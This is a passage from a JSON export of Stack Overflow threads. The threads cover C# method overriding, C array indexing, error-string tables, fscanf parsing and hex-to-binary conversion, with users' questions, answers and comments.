are inheriting <code>PurchasedItem.FindCost</code> but you also have the <code>FindCost</code> method in <code>FreshItem</code> so you get this error which is really clear and complains about what you did above:</p>\n\n<blockquote>\n  <p>Program.GroceryItem.PurchasedItem.FreshItem.FindCost()' hides inherited member 'Program.GroceryItem.PurchasedItem.FindCost()'. Use the new keyword if hiding was intended.</p>\n</blockquote>\n\n<p>To fix this error, you can declare the <code>PurchasedItem.FindCost</code> as virtual so you can then override it:</p>\n\n<pre><code>public virtual double FindCost()\n</code></pre>\n\n<p>Then in the <code>FreshItem</code>, override it:</p>\n\n<pre><code>public override double FindCost()\n</code></pre>\n\n<p>For the other error, see the answer from @MazaherBazari.</p>\n"}], "owner": {"reputation": 63, "user_id": 7994590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3998fd2e2aa8f500496a26befafc7675?s=128&d=identicon&r=PG&f=1", "display_name": "Rosco verheij", "link": "https://stackoverflow.com/users/7994590/rosco-verheij"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 50013831, "answer_count": 3, "score": 0, "last_activity_date": 1524738280, "creation_date": 1524626615, "last_edit_date": 1524738280, "question_id": 50013577, "link": "https://stackoverflow.com/questions/50013577/cant-work-out-method-overloading", "title": "Cant work out method overloading", "body": "<p>Im trying to overload the <em>FindCost</em> method in <em>PurchasedItem</em> with a new method in the <em>FreshItem</em> subclass. The new <em>FreshItem</em> <em>FindCost</em> method uses weight instead of quantity to determine the cost.</p>\n\n<p>Im getting errors :</p>\n\n<blockquote>\n  <p>There is no argument given that corresponds to the required formal parameter 'gItem'</p>\n  \n  <p>'Program.GroceryItem.PurchasedItem.FreshItem.FindCost()' hides inherited member 'Program.GroceryItem.PurchasedItem.FindCost()'. Use the new keyword if hiding was intended.</p>\n</blockquote>\n\n<p>How would I allow the <em>FreshItem</em> <em>FindCost</em> method to be used if the item is fresh?</p>\n\n<pre><code>    class Program\n    {\n        public class GroceryItem\n        {\n        public string Name;\n        public double Price;\n\n        public PurchasedItem pItem\n        {\n            get;\n            set;\n        }\n\n        public GroceryItem()\n        {\n        }\n\n        public GroceryItem(string name, double price)\n        {\n            this.Name = name;\n            this.Price = price;\n        }\n        public class PurchasedItem\n        {\n            public int Quantity;\n            GroceryItem item;\n            public PurchasedItem(GroceryItem gItem)\n            {\n                item = new GroceryItem(gItem.Name, gItem.Price);\n            }\n\n            public double FindCost()\n            {\n                return item.Price * this.Quantity * 1.10;\n            }\n\n            public class FreshItem : PurchasedItem\n            {\n                public FreshItem() \n                {\n                }\n                public double weight;\n\n                public double FindCost()\n                {\n                    return this.item.Price * this.weight;\n                }\n\n            }\n        }\n        public static void Main(string[] args)\n        {\n            var item1 = new GroceryItem(\"Lettuce\", 2.05);\n            item1.pItem = new GroceryItem.PurchasedItem(item1);\n            item1.pItem.Quantity = 12;\n            double cost1 = item1.pItem.FindCost();\n\n\n            Console.WriteLine(item1.Name + \" \" + item1.Price);\n            Console.WriteLine(cost1);\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 6196, "user_id": 5822075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1ba9afcd0c36d9685e3e1b5f2f82be2?s=128&d=identicon&r=PG&f=1", "display_name": "e0k", "link": "https://stackoverflow.com/users/5822075/e0k"}, "edited": false, "score": 0, "creation_date": 1524624736, "post_id": 50013211, "comment_id": 87043030, "body": "Did you try to randomly decide on a direction, then just iterate <code>X</code> accordingly?"}, {"owner": {"reputation": 15, "user_id": 8956896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04fc05b3ad61442ad8e30a0bd54c61a7?s=128&d=identicon&r=PG&f=1", "display_name": "dgnunch", "link": "https://stackoverflow.com/users/8956896/dgnunch"}, "reply_to_user": {"reputation": 6196, "user_id": 5822075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1ba9afcd0c36d9685e3e1b5f2f82be2?s=128&d=identicon&r=PG&f=1", "display_name": "e0k", "link": "https://stackoverflow.com/users/5822075/e0k"}, "edited": false, "score": 0, "creation_date": 1524624823, "post_id": 50013211, "comment_id": 87043052, "body": "I can&#39;t format my reply properly, anyways I planned to do that if I understand correctly but I need X to be 0 for the first iteration"}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 8956896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04fc05b3ad61442ad8e30a0bd54c61a7?s=128&d=identicon&r=PG&f=1", "display_name": "dgnunch", "link": "https://stackoverflow.com/users/8956896/dgnunch"}, "edited": false, "score": 0, "creation_date": 1524625042, "post_id": 50013361, "comment_id": 87043099, "body": "oh I somehow hadn&#39;t thought of that, I can just randomly choose which for loop I use! thank you!"}], "tags": [], "owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "is_accepted": true, "score": 0, "last_activity_date": 1524624743, "creation_date": 1524624743, "answer_id": 50013361, "question_id": 50013211, "link": "https://stackoverflow.com/questions/50013211/random-diagonal-2d-array-input/50013361#50013361", "title": "Random Diagonal 2D Array Input", "body": "<p>why not</p>\n\n<pre><code>for(i=0, j = 0; i &lt; wordLength &amp;&amp; j &lt; HEIGHT; j++, i++)\n    array[arrayRow-i][arrayColumn+i] = animals[k][j];\n</code></pre>\n\n<p>and</p>\n\n<pre><code>for(i=0, j = 0; i &lt; wordLength &amp;&amp; j &lt; HEIGHT; j++, i++)\n    array[arrayRow+j][arrayColumn-i] = animals[k][j];\n</code></pre>\n\n<p>etc. for different directions</p>\n\n<p>or alternatively</p>\n\n<pre><code>for(i=0, j = 0; i &lt; wordLength &amp;&amp; j &lt; HEIGHT; j++, i++)\n    array[arrayRow+wordlength-i-1][arrayColumn+i] = animals[k][j];\n</code></pre>\n\n<p>or if you want to use <code>x</code></p>\n\n<pre><code>for(i=0, j = 0; i &lt; wordLength &amp;&amp; j &lt; HEIGHT; j++, i++)\n {\n    x=wordlength-i-1;\n    array[arrayRow+x][arrayColumn+i] = animals[k][j];\n }\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 8956896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04fc05b3ad61442ad8e30a0bd54c61a7?s=128&d=identicon&r=PG&f=1", "display_name": "dgnunch", "link": "https://stackoverflow.com/users/8956896/dgnunch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 29, "favorite_count": 0, "accepted_answer_id": 50013361, "answer_count": 1, "score": 1, "last_activity_date": 1524693550, "creation_date": 1524623569, "last_edit_date": 1524693550, "question_id": 50013211, "link": "https://stackoverflow.com/questions/50013211/random-diagonal-2d-array-input", "title": "Random Diagonal 2D Array Input", "body": "<p>I'm trying to input words diagonally into a 2d array in C. I was able to do this for words horizontally and vertically, however it's trickier here because the words can be input going upwards or downwards diagonally. I want the variable X to be 0 for the first iteration of the loop, and then either increment for the rest of the loop or decrement for the rest of the loop (whichever one it does to be chosen randomly). Is that possible?</p>\n\n<pre><code>            for(i=0, j = 0; i &lt; wordLen &amp;&amp; j &lt; arrayHeight; j++, i++)\n                    array[arrayRow+X][arrayColumn+i] = wordList[k][j];\n</code></pre>\n\n<p>tl;dr I'm fixated on getting the X variable to do something specific in this manner, and I can't figure out how to do it</p>\n"}, {"tags": ["c", "error-handling", "string-formatting"], "comments": [{"owner": {"reputation": 3852, "user_id": 5321363, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153640801268875/picture?type=large", "display_name": "Rann Lifshitz", "link": "https://stackoverflow.com/users/5321363/rann-lifshitz"}, "edited": false, "score": 0, "creation_date": 1524620783, "post_id": 50012812, "comment_id": 87042188, "body": "how many formatted strings do you expected to use? that is - how many different types of the formatted strings will you have ?"}, {"owner": {"reputation": 69, "user_id": 2230504, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/286589e31beec9281f05278f51752039?s=128&d=identicon&r=PG", "display_name": "Sachin Weerasooriya", "link": "https://stackoverflow.com/users/2230504/sachin-weerasooriya"}, "reply_to_user": {"reputation": 3852, "user_id": 5321363, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153640801268875/picture?type=large", "display_name": "Rann Lifshitz", "link": "https://stackoverflow.com/users/5321363/rann-lifshitz"}, "edited": false, "score": 0, "creation_date": 1524621074, "post_id": 50012812, "comment_id": 87042247, "body": "It depends on the error. Some may just be strings with no formatting, i.e. <code>&quot;You have lost connection to the device&quot;</code>. Others may have several variables, i.e. <code>&quot;The current laser settings for DAC %d, pulsewidth %d, and period %d resulted in an invalid laser power %f&quot;, var1, var2, var3, var4</code>. I would say most won&#39;t need errors and only a very small number would ever need more than 5 variables inserted into the string"}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1524621453, "post_id": 50012812, "comment_id": 87042323, "body": "I don&#39;t understand something. Is the actual log function calling <code>fprintf(fp, &quot;%s&quot;, get_error_string(error_code));</code>. <i>Forgive me</i>  for changing the names, I tried to type it like you did but I couldn&#39;t."}, {"owner": {"reputation": 3852, "user_id": 5321363, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10153640801268875/picture?type=large", "display_name": "Rann Lifshitz", "link": "https://stackoverflow.com/users/5321363/rann-lifshitz"}, "edited": false, "score": 1, "creation_date": 1524622853, "post_id": 50012812, "comment_id": 87042584, "body": "I think these 2 links can help you out :  <a href=\"https://stackoverflow.com/questions/11180695/c-function-to-return-formatted-string\" title=\"c function to return formatted string\">stackoverflow.com/questions/11180695/&hellip;</a>  <a href=\"https://stackoverflow.com/questions/28622895/calling-a-function-within-fprintf-syntax-in-c-language\" title=\"calling a function within fprintf syntax in c language\">stackoverflow.com/questions/28622895/&hellip;</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524682193, "post_id": 50012812, "comment_id": 87074865, "body": "I hope you do know that the statement: <code>strerror( error );</code> will return a suitable string for most error conditions.  However, for errors specific to the application, something like this: In the code: <code>CommonWriteCdsLog(  eLL_Critical,             get_pFormatString( eFormat_CFFL_string ),             __FILE__, __LINE__,             &quot;LibFunc:popen() failed for &#39;bin&#47;date&#39;&quot;); </code> worked very well for  me. were ` get_pFormatString()` selected from a table of format strings and <code>eLL_Critical</code> was from a <code>enum</code> of values to determine if the message was to be logged. and the  (cont)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524682499, "post_id": 50012812, "comment_id": 87075025, "body": "cont: <code>eFormat_CFFL_string</code> was from a <code>enum</code> to select which format string and <code>__FILE__, __LINE__, &quot;LibFunc:popen() failed for &#39;bin&#47;date&#39;&quot;</code> were the values to be incorporated into that message. (cont)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524682640, "post_id": 50012812, "comment_id": 87075105, "body": "(cont) the function: <code>CommonWriteCdsLog()</code> formated the string using a <code>cast</code> statement for each format string enum and finally wrote the resulting message to the log.  You could generate a table of messages and use a <code>enum</code> to select which text from that table"}], "answers": [{"comments": [{"owner": {"reputation": 69, "user_id": 2230504, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/286589e31beec9281f05278f51752039?s=128&d=identicon&r=PG", "display_name": "Sachin Weerasooriya", "link": "https://stackoverflow.com/users/2230504/sachin-weerasooriya"}, "edited": false, "score": 0, "creation_date": 1524678003, "post_id": 50015942, "comment_id": 87072726, "body": "Unfortunately, there will be times I need to actually insert the variable values into different parts of the string, not just append them onto the end"}, {"owner": {"reputation": 1092, "user_id": 9167609, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/141aa63001cf2ec7ffbb8672be1c97aa?s=128&d=identicon&r=PG&f=1", "display_name": "Vishal-Lia", "link": "https://stackoverflow.com/users/9167609/vishal-lia"}, "reply_to_user": {"reputation": 69, "user_id": 2230504, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/286589e31beec9281f05278f51752039?s=128&d=identicon&r=PG", "display_name": "Sachin Weerasooriya", "link": "https://stackoverflow.com/users/2230504/sachin-weerasooriya"}, "edited": false, "score": 0, "creation_date": 1524720499, "post_id": 50015942, "comment_id": 87086825, "body": "It&#39;s best to keep the error codes simple. These kind of ERROR codes are meant to be constant. I don&#39;t understand why you have to append in between these strings. May be you can change the strings to be as simple as possible and generic."}], "tags": [], "owner": {"reputation": 1092, "user_id": 9167609, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/141aa63001cf2ec7ffbb8672be1c97aa?s=128&d=identicon&r=PG&f=1", "display_name": "Vishal-Lia", "link": "https://stackoverflow.com/users/9167609/vishal-lia"}, "is_accepted": false, "score": 1, "last_activity_date": 1524639606, "creation_date": 1524639606, "answer_id": 50015942, "question_id": 50012812, "link": "https://stackoverflow.com/questions/50012812/passing-variable-number-of-arguments-to-an-entry-in-a-char-array/50015942#50015942", "title": "Passing Variable Number of Arguments to an Entry in a Char* Array", "body": "<p>If the main aim is to add print along with other variable values, let ERROR string be constant. You can just add additional values when you are writing to file fp.</p>\n\n<pre><code>fprintf(fp, \"%s: %d %d\", ecodeName(ECODE_SAMPLE_ERR), myVarInt1, myVarInt2);\n</code></pre>\n"}], "owner": {"reputation": 69, "user_id": 2230504, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/286589e31beec9281f05278f51752039?s=128&d=identicon&r=PG", "display_name": "Sachin Weerasooriya", "link": "https://stackoverflow.com/users/2230504/sachin-weerasooriya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1524647438, "creation_date": 1524620014, "last_edit_date": 1524647438, "question_id": 50012812, "link": "https://stackoverflow.com/questions/50012812/passing-variable-number-of-arguments-to-an-entry-in-a-char-array", "title": "Passing Variable Number of Arguments to an Entry in a Char* Array", "body": "<p>I have been using the following link: <a href=\"https://www.embedded.com/design/programming-languages-and-tools/4215552/Seventeen-steps-to-safer-C-code\" rel=\"nofollow noreferrer\">https://www.embedded.com/design/programming-languages-and-tools/4215552/Seventeen-steps-to-safer-C-code</a> to enhance the current error logging of a project I am working on. </p>\n\n<p>My end goal is to generate an enum \"error type\". I would map these error types to a lookup table of char*'s which I could use to log a more detailed explanation of what the error is. </p>\n\n<p>This way, I have all my error codes and corresponding error strings in a central location and can easily modify/lookup a message and errorcode without having to dig through the code. </p>\n\n<p>As a PoC, my header file contains the following:</p>\n\n<pre><code>typedef enum {\n    ECODE_OK = 0,         // OK\n    ECODE_SAMPLE_ERR = 1,\n    ECODE_LAST\n} myEcodes;\n\nchar * ecodeMap[ECODE_LAST+1];\nchar * ecodeName(myEcodes err);\n</code></pre>\n\n<p>My implementation in C of the header is included below:</p>\n\n<pre><code>char * ecodeMap[ECODE_LAST+1] =\n{\n    \"No error to report\",\n    \"Example Error Code - Invalid Value\",\n    \"Last ecode place holder\"\n};\n\nchar * ecodeName(myEcodes err)\n{\n    return (char *) eyescanEcodeMap[err];\n}\n</code></pre>\n\n<p>My question is, say I have the following code snippet to log an error I encountered:</p>\n\n<pre><code>fprintf(fp, \"%s\", ecodeName(ECODE_SAMPLE_ERR));\n</code></pre>\n\n<p>What if I want ECODE_SAMPLE_ERR to actually contain a formatted string like</p>\n\n<pre><code>\"Example Error Code - Invalid Values: %d %d\", myVarInt1, myVarInt2\n</code></pre>\n\n<p>instead of just</p>\n\n<pre><code>\"Example Error Code - Invalid Value\"\n</code></pre>\n\n<p>What would be the best way to be able to format individual strings in my array of char* such that I can include the value of variables in particular entries?</p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524615289, "post_id": 50012322, "comment_id": 87041020, "body": "I don&#39;t get your question. Is <code>sample[0][0]=1; sample[0][1]=3;</code> C code showing the value at <code>0x0</code> and <code>0x1</code> or the actual string you want to read?"}, {"owner": {"reputation": 2729, "user_id": 6486187, "user_type": "registered", "profile_image": "https://graph.facebook.com/722616891201339/picture?type=large", "display_name": "Abhishek Keshri", "link": "https://stackoverflow.com/users/6486187/abhishek-keshri"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524615464, "post_id": 50012322, "comment_id": 87041048, "body": "@Pablo <code>sample[0][0]=1; sample[0][1]=3;</code> is the string that OP is reading from the file."}], "answers": [{"comments": [{"owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524616542, "post_id": 50012452, "comment_id": 87041253, "body": "Yes. What I gave is not the actual data. Just a simple example to show the format. I have about 200000 values:("}, {"owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "reply_to_user": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524616571, "post_id": 50012452, "comment_id": 87041262, "body": "@math17 - dont panic - see next edit in a couple of moments"}, {"owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524617334, "post_id": 50012452, "comment_id": 87041416, "body": "Thank you very much for your comment. I tried and got some warnings."}, {"owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524617374, "post_id": 50012452, "comment_id": 87041429, "body": "readingdata.c:16:17: warning: incompatible pointer types passing &#39;char *[100]&#39;       to parameter of type &#39;char *&#39; [-Wincompatible-pointer-types]         sprintf(string_input, &quot;sample[%d][%d]=\\%d;&quot;, i, j);                 ^~~~~~~~~~~~ /usr/include/secure/_stdio.h:47:28: note: expanded from macro &#39;sprintf&#39;   <b>builtin___sprintf_chk (str, 0, __darwin_obsz(str), __VA_ARGS</b>)                            ^~~ readingdata.c:16:49: warning: more &#39;%&#39; conversions than data arguments       [-Wformat]         sprintf(string_input, &quot;sample[%d][%d]=\\%d;&quot;, i, j);"}, {"owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524617392, "post_id": 50012452, "comment_id": 87041434, "body": "~~^ /usr/include/secure/_stdio.h:47:56: note: expanded from macro &#39;sprintf&#39;   <b>builtin___sprintf_chk (str, 0, __darwin_obsz(str), __VA_ARGS</b>)                                                        ^ readingdata.c:17:25: warning: incompatible pointer types passing &#39;char *[100]&#39;       to parameter of type &#39;const char *&#39; [-Wincompatible-pointer-types]         fscanf(samples, string_input, &amp;arr[i][j]);                         ^~~~~~~~~~~~"}, {"owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524617399, "post_id": 50012452, "comment_id": 87041439, "body": "/usr/include/stdio.h:250:55: note: passing argument to parameter here int      fscanf(FILE * __restrict, const char * __restrict, ...) __scanf..."}, {"owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "reply_to_user": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524618029, "post_id": 50012452, "comment_id": 87041578, "body": "@math17 --- ok think this is fixed now - and certainly much simpler and better - should have thought of this before."}, {"owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "edited": false, "score": 0, "creation_date": 1524638969, "post_id": 50012452, "comment_id": 87047721, "body": "Dear Tom. Thank you very much for your help.  With just slight modification in printf, I was able to get the exact form of the data as in the data set. printf(&quot;sample[%d][%d]=%d; &quot;,i,j,arr[i][j]);  The only thing that is not working is the values to the right of the equal sign but I&#39;ll work on this part. The most important part was to get the format correct and which now it is. Thanks again!"}], "tags": [], "owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "is_accepted": false, "score": 0, "last_activity_date": 1524617991, "last_edit_date": 1524617991, "creation_date": 1524616265, "answer_id": 50012452, "question_id": 50012322, "link": "https://stackoverflow.com/questions/50012322/reading-formatted-data-in-c/50012452#50012452", "title": "Reading formatted data in C", "body": "<p>You could read in with, for example for the first line of data,</p>\n\n<pre><code>fscanf(filein, \"sample[0][0]=%d; sample[0][1]=%d;\", &amp;arr[0][0], &amp;arr[0][1]);\n</code></pre>\n\n<p>but it is very fragile becaues if the input file is not exactly that then you will get unpredictable behaviour</p>\n\n<p>You could print out with</p>\n\n<pre><code>printf(\"(*inputs)[0][0] = %d;   (*outputs)[0]=%d;\", arr[0][0], arr[0][1]);\n</code></pre>\n\n<p>but probably I got the print statement wrong as I don't know exactly what you want your code to do.</p>\n\n<p>Now for lots of data.....</p>\n\n<p>new version... much simpler...D'oh!</p>\n\n<pre><code>int a,b;\n\nfor (i=0; i&lt;10; i++) {\n    for (j=0; j&lt;2; j++) {\n        fscanf(samples, \"sample[%d][%d]=\\%d;\", &amp;a, &amp;b, &amp;arr[i][j]);\n        printf(\"int = %d\\t\",  arr[i][j]);\n    }\n    printf(\"\\n\");\n}\n</code></pre>\n\n<p>so now you read in the number values from sample as <code>a</code> and <code>b</code> - but then don't used these value of <code>a</code> and <code>b</code> - though to write a good program you could check the values of <code>a</code> and <code>b</code> are equal to <code>i</code> and <code>j</code> as you expect.</p>\n\n<p>old not working version below</p>\n\n<pre><code>char* string_input[100]; // we need this to get the right format for scanf...\n\nfor (i=0; i&lt;10; i++) {\n    for (j=0; j&lt;2; j++) {\n        sprintf(string_input, \"sample[%d][%d]=\\%d;\", i, j)\n        fscanf(samples, string_input, &amp;arr[i][j]);\n        printf(\"int = %d\\t\",  arr[i][j]);\n    }\n    printf(\"\\n\");\n}\n</code></pre>\n\n<p>so what this does is make a taylor made string suitable for reading in your data line by line...</p>\n\n<p>so for example if <code>i=8</code> and <code>j=1</code> then <code>string_input</code> will be <code>sample[8][1]=%d;</code></p>\n"}], "owner": {"reputation": 27, "user_id": 9694032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b7787f34a2892c01b0e7ca619fbfdb8?s=128&d=identicon&r=PG&f=1", "display_name": "math17", "link": "https://stackoverflow.com/users/9694032/math17"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 453, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524617991, "creation_date": 1524615079, "question_id": 50012322, "link": "https://stackoverflow.com/questions/50012322/reading-formatted-data-in-c", "title": "Reading formatted data in C", "body": "<p>I have a data set with specific format that I want to read in C and also print in certain format. Here is the format of my data in text file:</p>\n\n<pre><code>sample[0][0]=1; sample[0][1]=3;\nsample[1][0]=2; sample[1][1]=4;\nsample[2][0]=3; sample[2][1]=5;\n</code></pre>\n\n<p>and I want to read this and return</p>\n\n<pre><code>  (*inputs)[0][0] = 1;   (*outputs)[0]=3;\n  (*inputs)[1][0] = 2;   (*outputs)[1]=4;\n  (*inputs)[2][0] = 3;   (*outputs)[2]=5;\n</code></pre>\n\n<p>I was able to write a code that will read my file in just the following format:</p>\n\n<pre><code>1 3\n2 4\n3 5\n</code></pre>\n\n<p>and here is my code:</p>\n\n<pre><code>int main() {\nFILE *samples;\nsamples = fopen (\"peaks.txt\",\"r\");\n\nint arr[10][2];\nint i;\nint j;\nfor (i=0; i&lt;10; i++) {\n    for (j=0; j&lt;2; j++) {\n        fscanf(samples, \"%d, \", &amp;arr[i][j]);\n        printf(\"int = %d\\t\",  arr[i][j]);\n    }\n    printf(\"\\n\");\n}\n\n}\n</code></pre>\n\n<p>How do I modify this code to read the format above? Thank you.</p>\n"}, {"tags": ["c", "binary", "hex", "bit-manipulation"], "answers": [{"comments": [{"owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "reply_to_user": {"reputation": 177, "user_id": 5043033, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4oerX.jpg?s=128&g=1", "display_name": "Jeremy Pare", "link": "https://stackoverflow.com/users/5043033/jeremy-pare"}, "edited": false, "score": 0, "creation_date": 1524623237, "post_id": 50012574, "comment_id": 87042664, "body": "@JeremyPare - NB just edited with bitwise solution, but I would proceed with care for that..... glad it was helpful"}], "tags": [], "owner": {"reputation": 1253, "user_id": 3596376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aeldq.jpg?s=128&g=1", "display_name": "tom", "link": "https://stackoverflow.com/users/3596376/tom"}, "is_accepted": false, "score": 2, "last_activity_date": 1524624238, "last_edit_date": 1524624238, "creation_date": 1524617581, "answer_id": 50012574, "question_id": 50012299, "link": "https://stackoverflow.com/questions/50012299/convert-hexadecimal-made-up-of-0s-and-1s-to-binary-equivalent/50012574#50012574", "title": "Convert hexadecimal made up of 0&#39;s and 1&#39;s to binary equivalent", "body": "<p>A one line fix for 16bit hex would be....</p>\n\n<pre><code>bin = ((hex%16)?1:0) + (((hex/16)%16)?2:0) + (((hex/256)%16)?4:0) + (((hex/4096)%16)?8:0);\n</code></pre>\n\n<p>though this is no the bitwise operations you want. Not sure if <code>&gt;&gt;</code> works on <code>int</code> or at least is specified to always work on <code>uint16_t</code> - You might want to look at <a href=\"https://stackoverflow.com/questions/26213330/cast-from-int-to-unsigned-short-after-applying-bitwise-operator\">this question</a> to think about bitwise operators and <code>uint16_t</code> - if it is ok then </p>\n\n<pre><code>bin = (hex &amp; 1) |\n      (((hex &gt;&gt; 4) &amp; 0x1) &lt;&lt; 1) |\n      (((hex &gt;&gt; 8) &amp; 0x1) &lt;&lt; 2) |\n      (((hex &gt;&gt; 12) &amp; 0x1) &lt;&lt; 3);\n</code></pre>\n\n<p>would work given that your <code>hex</code> bytes are either <code>F</code> or <code>0</code>.</p>\n\n<p>Old answer for arbitrary size hex is below</p>\n\n<pre><code>int hex;\nint bin;\n\nint n, m, k;\n\n//assume hex has your hex value\nn=0; bin=0;\nwhile(pow(16.0,(double)n)&lt;(double)hex+0.5) // test if we are done\n {\n  m=1; for(k=0;k&lt;n;k++) m*=16; \n  if ((hex/m)%16!=0) {\n     m=1;for(k=0;k&lt;n;k++) m*=2;\n     bin += m;\n  }\n  n++;\n }\n</code></pre>\n\n<p>this should convert any 0x.... into 0b.... where you get a 1 for each digit if the hex digit is not equal to zero. The key part is <code>(hex/m)%16!=0</code> which tests the nth digit of the <code>hex</code> number to see if it is zero or non zero.</p>\n"}, {"comments": [{"owner": {"reputation": 177, "user_id": 5043033, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4oerX.jpg?s=128&g=1", "display_name": 